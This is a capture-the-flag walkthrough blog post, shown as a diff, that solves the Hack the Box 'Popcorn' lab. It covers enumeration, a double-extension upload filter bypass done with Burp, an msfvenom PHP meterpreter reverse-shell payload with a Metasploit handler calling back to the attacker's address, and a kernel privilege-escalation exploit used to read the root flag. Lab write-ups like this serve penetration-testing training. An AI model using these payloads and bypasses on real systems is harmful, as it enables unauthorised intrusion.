@@ -1,0 +1,195 @@
+
+								
+																		Hack the Box Challenge: Popcorn Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 28, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Popcorn” which is available online for those who want to increase their skill in penetration testing and black box testing. popcorn is retried vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level, they have a collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Intermediate
+Task: find user.txt and root.txt file in the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.6 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.6
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.6
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 22,80 are open in the victim’s network.
+
+Knowing port 80 is open in the victim’s network we preferred to explore his IP in the browser but didn’t get any remarkable clue for the next step.
+
+Next, we have used dirb tool of Kali to enumerate the directories from using the IP Address. The command we have used is dirb http://10.10.10.6  After checking most of the directories, we finally decided to go for /torrent directory.
+
+So next we decided to explore http://10.10.10.6/torrent/ through browser URL and what we see is a Webpage shown below. After looking at the page for some clue, we saw that we need to register on this site first.
+
+After clicking on Register option on the Webpage. The registration form opened is shown below. As you can see you need to give details to successfully register on this site.
+
+After successfully registering on the website. Click on Upload option and the page opened is shown below. Now here we have given the path of any torrent file. Then Click on upload.
+
+When the torrent file is successfully uploaded the next page we are redirected to is shown below. Now simply click on Edit this torrent option.
+
+Now using Metasploit we have created a payload in php by using the command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw
+					
+				
+			
+		
+
+
+Now the problem we got was while we are uploading a php file in the update screenshot option it was not taking a php file. So what we did here is renamed the file with php.png which is 123.php.png. And Clicked on Submit Screenshot.
+
+But before clicking on submit screenshot we have captured the request of this page using Burp Suite. Where you can see our file with a double extension has been successfully submitted.
+
+As you can see have edited the file name to 123.php. Now Click on Forward option in burp suite.
+
+Next, we saw that our file has been successfully uploaded.
+
+Next, we have again used dirb tool of kali to enumerate the directories from using the IP Address. The command we have used is dirb http://10.10.10.6/torrent/. After checking most of the directories, we finally decided to go for /torrent/upload/ directory.
+
+So next we decided to explore http://10.10.10.6/torrent/upload/ through browser URL and what we see is a Webpage shown below. We see that our file has been successfully uploaded. By click on the file, we have uploaded.
+
+We have used Metasploit and got the meterpreter as you can see below.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.3
+msf exploit(multi/handler) set lport 4321
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.3msf exploit(multi/handler) set lport 4321msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+Once we have got the meterpreter. We have used command cd /home. Then we check inside the george directory using command ls /home/george, here we found out the user.txt file and read the file content which contains our first FLAG!!
+
+Now have searched kernel exploit on google, where we found that it is an exploit which is used for getting Local privilege escalation. We have simply downloaded the file on our Desktop.
+
+As you can see we have uploaded using the command upload /root/Desktop/15704.c Now we have used the command shell to access the root privilege. Now we have compiled. Next, we have given permission to the exploit. Using cd /root command we have found a root.txt file. And to view the contents we have used cat root.txt command. In the end, we have found our Final FLAG!!
+
+Author: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles. He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
